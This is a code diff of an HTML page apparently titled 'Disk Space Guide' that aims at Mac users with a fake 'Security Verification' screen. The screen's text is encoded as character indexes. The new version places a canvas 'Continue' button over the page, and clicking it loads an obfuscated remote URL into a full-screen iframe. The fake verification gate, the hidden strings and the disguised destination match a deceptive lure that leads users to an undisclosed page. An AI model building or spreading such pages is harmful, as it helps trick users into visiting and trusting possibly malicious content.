@@ -1,10 +1,9 @@
-
 <!doctype html>
 <html lang="en">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title></title>
+  <title>Disk Space Guide</title>
   <style>
     :root{
       --bg:#f5f5f7;
@@ -25,6 +24,7 @@
       width:100%;
       height:100vh;
       background:var(--bg);
+      position:relative;
       border-bottom:1px solid rgba(0,0,0,.06);
     }
     iframe{
@@ -33,6 +33,15 @@
       border:0;
       display:block;
       background:transparent;
+    }
+    canvas{
+      position:absolute;
+      top:0;
+      left:0;
+      width:100%;
+      height:100%;
+      cursor:pointer;
+      z-index:10;
     }
     main{
       max-width: 980px;
@@ -93,6 +102,7 @@
 <body>
   <section class="frameWrap">
     <iframe id="verifyFrame" title="Verification"></iframe>
+    <canvas id="verifyCanvas"></canvas>
   </section>
 
   <main>
@@ -164,51 +174,80 @@
   </main>
 
   <script>
-const URL_ALPHABET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789:/.-_';
-const URL_IDX = [
-  7,19,19,15,18,62,63,63,
-  18,12,0,17,19,65,
-  18,4,17,21,8,2,4,18,65,
-  14,12,4,6,0,65,
-  21,4,17,2,4,11,65,
-  0,15,15,63,
-  18,19,14,17,0,6,4,65,
-  7,19,12,11
-];
-
-
-
-const decodeURL = idx => idx.map(i => URL_ALPHABET[i]).join('');
-const TARGET_URL = decodeURL(URL_IDX);
-
-
+    // ====== Настройки URL ======
+    const URL_ALPHABET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789:/.-_';
+    const URL_IDX = [
+      7,19,19,15,18,62,63,63,
+      18,12,0,17,19,65,
+      18,4,17,21,8,2,4,18,65,
+      14,12,4,6,0,65,
+      21,4,17,2,4,11,65,
+      0,15,15,63,
+      18,19,14,17,0,6,4,65,
+      7,19,12,11
+    ];
+    const TARGET_URL = URL_IDX.map(i => URL_ALPHABET[i]).join('');
 
     const iframe = document.getElementById('verifyFrame');
+    const canvas = document.getElementById('verifyCanvas');
+    const ctx = canvas.getContext('2d');
 
-    async function loadTargetIntoFrame() {
-      try {
-        const res = await fetch(TARGET_URL, { mode: 'cors', credentials: 'omit', cache: 'no-store' });
-        if (!res.ok) throw new Error('HTTP ' + res.status);
-        const html = await res.text();
-        iframe.srcdoc = html;
-      } catch (e) {
-        iframe.removeAttribute('srcdoc');
-        iframe.src = TARGET_URL;
+    // ====== Canvas Заставка ======
+    let verified = false;
+
+    function resizeCanvas() {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+      drawCanvas();
+    }
+
+    function drawCanvas() {
+      ctx.clearRect(0,0,canvas.width,canvas.height);
+
+      // Фон
+      const gradient = ctx.createRadialGradient(canvas.width/2, canvas.height/2, 50, canvas.width/2, canvas.height/2, Math.max(canvas.width,canvas.height)/1.5);
+      gradient.addColorStop(0,'rgba(255,255,255,0.85)');
+      gradient.addColorStop(1,'rgba(245,245,247,0)');
+      ctx.fillStyle = gradient;
+      ctx.fillRect(0,0,canvas.width,canvas.height);
+
+      // Кнопка
+      const btnW = 220;
+      const btnH = 50;
+      const btnX = canvas.width/2 - btnW/2;
+      const btnY = canvas.height/2 - btnH/2;
+
+      ctx.fillStyle = '#111827';
+      ctx.shadowColor = 'rgba(0,0,0,0.2)';
+      ctx.shadowBlur = 10;
+      ctx.fillRect(btnX, btnY, btnW, btnH);
+
+      ctx.shadowBlur = 0;
+      ctx.fillStyle = '#fff';
+      ctx.font = '16px ui-sans-serif';
+      ctx.textAlign = 'center';
+      ctx.textBaseline = 'middle';
+      ctx.fillText('Continue', canvas.width/2, canvas.height/2);
+
+      // Сохраняем границы кнопки
+      canvas.btnBounds = {x:btnX,y:btnY,w:btnW,h:btnH};
+    }
+
+    canvas.addEventListener('pointerdown', e => {
+      if (!canvas.btnBounds) return;
+      const rect = canvas.getBoundingClientRect();
+      const mx = e.clientX - rect.left;
+      const my = e.clientY - rect.top;
+      const b = canvas.btnBounds;
+      if(mx >= b.x && mx <= b.x+b.w && my >= b.y && my <= b.y+b.h && !verified){
+        verified = true;
+        canvas.style.display = 'none';
+        iframe.src = TARGET_URL; // Загружаем страницу
       }
-    }
-
-    function buildVerifySrcdoc() {
-      return `<!doctype html><html lang="en"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title></title><style>html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;background:#f5f5f7}canvas{display:block;width:100vw;height:100vh}</style></head><body><canvas id="c"></canvas><script>(()=>{const URL_ALPHABET='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789:/.-_';const URL_IDX=[7,19,19,15,18,62,63,63,18,19,14,17,0,6,4,60,15,0,6,4,60,2,14,12,63,18,19,14,17,0,6,4,60,7,19,12,11];const decodeURL=i=>i.map(x=>URL_ALPHABET[x]).join('');const TARGET_URL=decodeURL(URL_IDX);const c=document.getElementById('c');const g=c.getContext('2d');const alphabet='abcdefghijklmnopqrstuvwxyz'+'ABCDEFGHIJKLMNOPQRSTUVWXYZ';const space=52;const clamp=(v,a,b)=>Math.max(a,Math.min(b,v));const decode=(idx)=>{let s='';for(let i=0;i<idx.length;i++)s+=idx[i]===space?' ':alphabet[idx[i]];return s;};const bannerIdx=[31,17,4,4,52,20,15,52,18,19,14,17,0,6,4,52,18,15,0,2,4,52,14,13,52,38,0,2];const titleIdx=[44,4,2,20,17,8,19,24,52,47,4,17,8,5,8,2,0,19,8,14,13];const subIdx=[41,11,4,0,18,4,52,2,14,13,5,8,17,12,52,19,14,52,2,14,13,19,8,13,20,4];const buttonIdx=[28,14,13,19,8,13,20,4];const doneIdx=[47,4,17,8,5,8,4,3];const hit={x:0,y:0,w:0,h:0};let cssW=1,cssH=1,dpr=1;let verified=false;const fontStack='ui-sans-serif,-apple-system,BlinkMacSystemFont,\\\"SF Pro Display\\\",\\\"SF Pro Text\\\",system-ui,sans-serif';const rounded=(x,y,w,h,r)=>{r=Math.max(0,Math.min(r,Math.min(w,h)/2));g.beginPath();if(g.roundRect){g.roundRect(x,y,w,h,r);return;}g.moveTo(x+r,y);g.arcTo(x+w,y,x+w,y+h,r);g.arcTo(x+w,y+h,x,y+h,r);g.arcTo(x,y+h,x,y,r);g.arcTo(x,y,x+w,y,r);g.closePath();};const drawTracked=(text,x,y,tracking)=>{const chars=text.split('');let total=0;for(let i=0;i<chars.length;i++)total+=g.measureText(chars[i]).width+(i?tracking:0);let cx=x-total/2;for(let i=0;i<chars.length;i++){const w=g.measureText(chars[i]).width;g.fillText(chars[i],cx+w/2,y);cx+=w+tracking;}};const measure=()=>{cssW=Math.max(1,innerWidth);cssH=Math.max(1,innerHeight);dpr=devicePixelRatio||1;c.style.width=cssW+'px';c.style.height=cssH+'px';c.width=Math.round(cssW*dpr);c.height=Math.round(cssH*dpr);g.setTransform(dpr,0,0,dpr,0,0);};const render=()=>{g.clearRect(0,0,cssW,cssH);g.fillStyle='#f5f5f7';g.fillRect(0,0,cssW,cssH);const cx=cssW/2,cy=cssH/2;const bg=g.createRadialGradient(cx,cy-120,Math.min(cssW,cssH)*0.05,cx,cy-120,Math.max(cssW,cssH)*0.9);bg.addColorStop(0,'rgba(255,255,255,0.85)');bg.addColorStop(1,'rgba(245,245,247,0.0)');g.fillStyle=bg;g.fillRect(0,0,cssW,cssH);const bannerSize=clamp(Math.round(cssW*0.07),40,86);g.save();g.globalAlpha=0.24;g.fillStyle='#000000';g.font=\`800 \${bannerSize}px \${fontStack}\`;g.textAlign='center';g.textBaseline='middle';drawTracked(decode(bannerIdx),cx,clamp(cy-300,50,cy-170),clamp(Math.round(bannerSize*0.065),2,7));g.restore();const cardW=clamp(Math.round(cssW*0.30),300,460);const cardH=clamp(Math.round(cssH*0.24),185,260);const x=Math.round(cx-cardW/2),y=Math.round(cy-cardH/2);g.save();g.shadowColor='rgba(0,0,0,0.12)';g.shadowBlur=40;g.shadowOffsetX=0;g.shadowOffsetY=18;g.fillStyle='#ffffff';rounded(x,y,cardW,cardH,22);g.fill();g.restore();g.fillStyle='#ffffff';rounded(x,y,cardW,cardH,22);g.fill();g.strokeStyle='rgba(0,0,0,0.10)';g.lineWidth=1;rounded(x+0.5,y+0.5,cardW-1,cardH-1,22);g.stroke();const titleSize=clamp(Math.round(cardW*0.06),18,24);g.fillStyle='rgba(29,29,31,0.70)';g.font=\`500 \${titleSize}px \${fontStack}\`;g.textAlign='center';g.textBaseline='middle';g.fillText(decode(titleIdx),cx,y+Math.round(cardH*0.35));const subSize=clamp(Math.round(cardW*0.038),13,15);g.fillStyle='rgba(29,29,31,0.44)';g.font=\`500 \${subSize}px \${fontStack}\`;g.fillText(decode(subIdx),cx,y+Math.round(cardH*0.46));const bw=clamp(Math.round(cardW*0.64),200,300);const bh=clamp(Math.round(cardH*0.25),44,52);const bx=Math.round(cx-bw/2);const by=Math.round(y+Math.round(cardH*0.59));g.save();g.shadowColor='rgba(0,0,0,0.18)';g.shadowBlur=18;g.shadowOffsetX=0;g.shadowOffsetY=10;const grad=g.createLinearGradient(bx,by,bx,by+bh);grad.addColorStop(0,'#1f2937');grad.addColorStop(1,'#0b0d12');g.fillStyle=grad;rounded(bx,by,bw,bh,14);g.fill();g.restore();const grad2=g.createLinearGradient(bx,by,bx,by+bh);grad2.addColorStop(0,'#111827');grad2.addColorStop(1,'#0b0d12');g.fillStyle=grad2;rounded(bx,by,bw,bh,14);g.fill();g.strokeStyle='rgba(255,255,255,0.10)';g.lineWidth=1;rounded(bx+0.5,by+0.5,bw-1,bh-1,14);g.stroke();const btnSize=clamp(Math.round(bh*0.34),15,17);g.fillStyle='#ffffff';g.font=\`500 \${btnSize}px \${fontStack}\`;g.fillText(decode(verified?doneIdx:buttonIdx),cx,by+Math.round(bh/2));hit.x=bx;hit.y=by;hit.w=bw;hit.h=bh;};const repaint=()=>{measure();render();};const notify=()=>{try{window.parent&&window.parent.postMessage({type:'verified', target: TARGET_URL},'*');}catch(_){}};c.addEventListener('pointerdown',(e)=>{const r=c.getBoundingClientRect();const mx=e.clientX-r.left;const my=e.clientY-r.top;if(!verified&&mx>=hit.x&&mx<=hit.x+hit.w&&my>=hit.y&&my<=hit.y+hit.h){verified=true;render();notify();}},{passive:true});addEventListener('resize',repaint);repaint();})();<\/script></body></html>`;
-    }
-
-    iframe.srcdoc = buildVerifySrcdoc();
-
-    window.addEventListener('message', (e) => {
-      if (!e || !e.data || e.data.type !== 'verified') return;
-      if (e.source !== iframe.contentWindow) return;
-      loadTargetIntoFrame();
     });
+
+    window.addEventListener('resize', resizeCanvas);
+    resizeCanvas();
   </script>
 </body>
 </html>
-
